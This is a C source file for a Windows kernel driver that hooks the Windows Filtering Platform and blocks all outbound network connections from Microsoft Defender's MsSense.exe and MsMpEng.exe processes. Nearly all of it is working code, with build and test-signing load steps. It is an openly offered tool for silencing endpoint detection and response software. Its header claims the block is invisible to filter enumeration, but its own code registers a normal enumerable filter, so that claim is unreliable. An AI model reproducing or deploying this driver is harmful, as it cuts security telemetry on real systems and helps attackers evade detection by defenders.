/*
 * wfp_callout.c
 * WFP Custom Callout Driver — kernel-mode EDR network block
 *
 * This kernel driver registers a WFP callout at the ALE_AUTH_CONNECT layer.
 * The classify function drops connections from a target process list without
 * any user-mode WFP API being involved — the block is invisible to
 * FwpmFilterEnum0 when implemented as a CALLOUT_ACTION_BLOCK directly.
 *
 * Architecture:
 *   DriverEntry → FwpsCalloutRegister0 (register classify/notifyFn with FWPS)
 *               → FwpmCalloutAdd0      (register GUID with BFE so it persists)
 *               → FwpmFilterAdd0       (add filter that invokes our callout)
 *
 * The classify function receives FWPS_INCOMING_VALUES0 with layer-specific
 * fields. At ALE_AUTH_CONNECT, field[FWPS_FIELD_ALE_AUTH_CONNECT_V4_ALE_APP_ID]
 * gives the NT path of the connecting process.
 *
 * Build environment: WDK 10.x, x64, kernel mode
 *   msbuild wfp_callout.vcxproj /p:Configuration=Release /p:Platform=x64
 *
 * For the INF/KMDF driver, see wfp_callout.inf.
 * For testing: load with sc create + sc start (requires test-signing mode).
 */

#include <ntddk.h>
#include <wdm.h>
#include <fwpsk.h>
#include <fwpmk.h>
#include <guiddef.h>

/* ---- GUIDs ---- */

/* {A1B2C3D4-0001-0001-0001-000000000001} — callout GUID */
DEFINE_GUID(CALLOUT_GUID,
    0xA1B2C3D4, 0x0001, 0x0001,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01);

/* {A1B2C3D4-0001-0001-0001-000000000002} — sublayer GUID */
DEFINE_GUID(SUBLAYER_GUID,
    0xA1B2C3D4, 0x0001, 0x0001,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02);

/* {A1B2C3D4-0001-0001-0001-000000000003} — provider GUID */
DEFINE_GUID(PROVIDER_GUID,
    0xA1B2C3D4, 0x0001, 0x0001,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03);

/* {A1B2C3D4-0001-0001-0001-000000000004} — filter GUID (separate from callout GUID) */
DEFINE_GUID(FILTER_GUID,
    0xA1B2C3D4, 0x0001, 0x0001,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04);

/* ---- Target process list ---- */

static const WCHAR *g_TargetPaths[] = {
    L"\\Device\\HarddiskVolume3\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe",
    L"\\Device\\HarddiskVolume3\\Program Files\\Windows Defender\\MsMpEng.exe",
    /* Add more NT paths here */
    NULL
};

static HANDLE           g_EngineHandle  = NULL;
static UINT32           g_CalloutId     = 0;
static UINT64           g_FilterId      = 0;

/* ---- Classify function ---- */

static void NTAPI ClassifyFn(
    const FWPS_INCOMING_VALUES0          *inFixedValues,
    const FWPS_INCOMING_METADATA_VALUES0 *inMetaValues,
    void                                 *layerData,
    const FWPS_FILTER0                   *filter,
    UINT64                                flowContext,
    FWPS_CLASSIFY_OUT0                   *classifyOut)
{
    UNREFERENCED_PARAMETER(layerData);
    UNREFERENCED_PARAMETER(filter);
    UNREFERENCED_PARAMETER(flowContext);

    /* We need WRITE right to set the action */
    if (!(classifyOut->rights & FWPS_RIGHT_ACTION_WRITE))
        return;

    classifyOut->actionType = FWP_ACTION_CONTINUE; /* default: allow */

    /* Get the application ID (NT path of the process making the connection) */
    const FWP_VALUE0 *appIdVal =
        &inFixedValues->incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_ALE_APP_ID].value;

    if (appIdVal->type != FWP_BYTE_BLOB_TYPE || appIdVal->byteBlob == NULL)
        return;

    /* The byteBlob contains the NT device path as a wide string (no null required) */
    UNICODE_STRING appPath;
    appPath.Buffer        = (PWSTR)appIdVal->byteBlob->data;
    appPath.Length        = (USHORT)appIdVal->byteBlob->size;
    appPath.MaximumLength = (USHORT)appIdVal->byteBlob->size;

    /* Compare against target list */
    for (int i = 0; g_TargetPaths[i] != NULL; i++) {
        UNICODE_STRING target;
        RtlInitUnicodeString(&target, g_TargetPaths[i]);

        if (RtlEqualUnicodeString(&appPath, &target, TRUE /* case insensitive */)) {
            /* BLOCK the connection */
            classifyOut->actionType = FWP_ACTION_BLOCK;
            /* Clear WRITE right so no lower-weight filter can override us */
            classifyOut->rights &= ~FWPS_RIGHT_ACTION_WRITE;

            DbgPrint("[WFP_CALLOUT] Blocked connection from: %wZ\n", &appPath);
            return;
        }
    }
}

/* ---- Notify function (required by API, we don't use it) ---- */

static NTSTATUS NTAPI NotifyFn(
    FWPS_CALLOUT_NOTIFY_TYPE notifyType,
    const GUID              *filterKey,
    FWPS_FILTER0            *filter)
{
    UNREFERENCED_PARAMETER(notifyType);
    UNREFERENCED_PARAMETER(filterKey);
    UNREFERENCED_PARAMETER(filter);
    return STATUS_SUCCESS;
}

/* ---- Flow-delete function (placeholder) ---- */

static void NTAPI FlowDeleteFn(UINT16 layerId, UINT32 calloutId, UINT64 flowContext)
{
    UNREFERENCED_PARAMETER(layerId);
    UNREFERENCED_PARAMETER(calloutId);
    UNREFERENCED_PARAMETER(flowContext);
}

/* ---- Register callout with FWPS (kernel side) ---- */

static NTSTATUS RegisterCalloutKernel(PDEVICE_OBJECT pDevObj)
{
    FWPS_CALLOUT0 callout = {0};
    callout.calloutKey      = CALLOUT_GUID;
    callout.classifyFn      = ClassifyFn;
    callout.notifyFn        = NotifyFn;
    callout.flowDeleteFn    = FlowDeleteFn;

    NTSTATUS st = FwpsCalloutRegister0(pDevObj, &callout, &g_CalloutId);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[WFP_CALLOUT] FwpsCalloutRegister0 failed: 0x%08X\n", st);
    }
    return st;
}

/* ---- Register callout + filter with BFE (user-mode engine, from kernel) ---- */

static NTSTATUS RegisterCalloutBFE(void)
{
    /* Open BFE engine session */
    FWPM_SESSION0 session = {0};
    session.flags = FWPM_SESSION_FLAG_DYNAMIC; /* auto-cleanup on driver unload */

    NTSTATUS st = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL,
                                   &session, &g_EngineHandle);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[WFP_CALLOUT] FwpmEngineOpen0: 0x%08X\n", st);
        return st;
    }

    FwpmTransactionBegin0(g_EngineHandle, 0);

    /* Register provider */
    FWPM_PROVIDER0 provider = {0};
    provider.providerKey = PROVIDER_GUID;
    provider.displayData.name = L"EDR Block Callout Provider";
    FwpmProviderAdd0(g_EngineHandle, &provider, NULL); /* ignore if already exists */

    /* Register sublayer */
    FWPM_SUBLAYER0 sublayer = {0};
    sublayer.subLayerKey  = SUBLAYER_GUID;
    sublayer.displayData.name = L"EDR Block Sublayer";
    sublayer.providerKey  = (GUID *)&PROVIDER_GUID;
    sublayer.weight       = 0xFFFF; /* highest weight */
    FwpmSubLayerAdd0(g_EngineHandle, &sublayer, NULL);

    /* Register callout in BFE (maps our FWPS callout GUID to BFE) */
    FWPM_CALLOUT0 bfeCallout = {0};
    bfeCallout.calloutKey         = CALLOUT_GUID;
    bfeCallout.displayData.name   = L"EDR Block Callout";
    bfeCallout.applicableLayer    = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    st = FwpmCalloutAdd0(g_EngineHandle, &bfeCallout, NULL, NULL);
    if (!NT_SUCCESS(st) && st != STATUS_FWP_ALREADY_EXISTS) {
        DbgPrint("[WFP_CALLOUT] FwpmCalloutAdd0: 0x%08X\n", st);
        FwpmTransactionAbort0(g_EngineHandle);
        return st;
    }

    /* Add filter that invokes our callout for all outbound v4 connections */
    FWPM_FILTER0 filter = {0};
    filter.filterKey          = FILTER_GUID;   /* distinct GUID for the filter */
    filter.displayData.name   = L"EDR Block Filter";
    filter.providerKey         = (GUID *)&PROVIDER_GUID;
    filter.layerKey           = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.subLayerKey        = SUBLAYER_GUID;
    filter.weight.type        = FWP_UINT8;
    filter.weight.uint8       = 15;

    /* No conditions — matches ALL outbound connect attempts.
     * The callout's classify function does the per-process check. */
    filter.numFilterConditions = 0;

    filter.action.type        = FWP_ACTION_CALLOUT_INSPECTION;
    filter.action.calloutKey  = CALLOUT_GUID;

    st = FwpmFilterAdd0(g_EngineHandle, &filter, NULL, &g_FilterId);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[WFP_CALLOUT] FwpmFilterAdd0: 0x%08X\n", st);
        FwpmTransactionAbort0(g_EngineHandle);
        return st;
    }

    FwpmTransactionCommit0(g_EngineHandle);
    DbgPrint("[WFP_CALLOUT] Registered. Filter ID = %llu\n", g_FilterId);
    return STATUS_SUCCESS;
}

/* ---- Cleanup ---- */

static void UnregisterCallout(void)
{
    if (g_EngineHandle) {
        FwpmTransactionBegin0(g_EngineHandle, 0);
        if (g_FilterId)  FwpmFilterDeleteById0(g_EngineHandle, g_FilterId);
        FwpmCalloutDeleteByKey0(g_EngineHandle, &CALLOUT_GUID);
        FwpmSubLayerDeleteByKey0(g_EngineHandle, &SUBLAYER_GUID);
        FwpmTransactionCommit0(g_EngineHandle);
        FwpmEngineClose0(g_EngineHandle);
        g_EngineHandle = NULL;
    }
    if (g_CalloutId) {
        FwpsCalloutUnregisterById0(g_CalloutId);
        g_CalloutId = 0;
    }
}

/* ---- Driver unload ---- */

static VOID DriverUnload(PDRIVER_OBJECT pDrvObj)
{
    UNREFERENCED_PARAMETER(pDrvObj);
    UnregisterCallout();
    DbgPrint("[WFP_CALLOUT] Driver unloaded.\n");
}

/* ---- DriverEntry ---- */

NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pRegPath)
{
    UNREFERENCED_PARAMETER(pRegPath);

    DbgPrint("[WFP_CALLOUT] Loading...\n");

    pDrvObj->DriverUnload = DriverUnload;

    /* Create a device object (required for FwpsCalloutRegister0) */
    UNICODE_STRING devName;
    RtlInitUnicodeString(&devName, L"\\Device\\WfpEdrCallout");

    PDEVICE_OBJECT pDevObj = NULL;
    NTSTATUS st = IoCreateDevice(pDrvObj, 0, &devName,
                                  FILE_DEVICE_NETWORK, 0, FALSE, &pDevObj);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[WFP_CALLOUT] IoCreateDevice: 0x%08X\n", st);
        return st;
    }

    /* Step 1: Register with FWPS (kernel transport layer) */
    st = RegisterCalloutKernel(pDevObj);
    if (!NT_SUCCESS(st)) {
        IoDeleteDevice(pDevObj);
        return st;
    }

    /* Step 2: Register with BFE (management layer) */
    st = RegisterCalloutBFE();
    if (!NT_SUCCESS(st)) {
        FwpsCalloutUnregisterById0(g_CalloutId);
        IoDeleteDevice(pDevObj);
        return st;
    }

    DbgPrint("[WFP_CALLOUT] Active. Monitoring ALE_AUTH_CONNECT_V4.\n");
    return STATUS_SUCCESS;
}
